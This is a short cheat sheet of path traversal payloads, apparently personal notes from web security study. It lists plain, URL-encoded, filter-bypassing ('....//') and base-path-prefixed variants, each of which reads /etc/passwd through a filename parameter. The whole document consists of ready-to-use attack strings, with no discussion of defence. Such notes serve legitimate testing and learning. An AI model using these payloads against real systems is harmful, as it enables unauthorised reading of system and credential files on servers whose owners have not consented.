# notes
## **PATH TRAVERSAL**
Default way:

>GET /image?filename=../../../../../../../../etc/passwd

Url-Encoded:

>%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64

Way, when `../` erased:

>....//....//....//....//

When filename should start with some string 

>/var/www/images/../../../../../etc/passwd
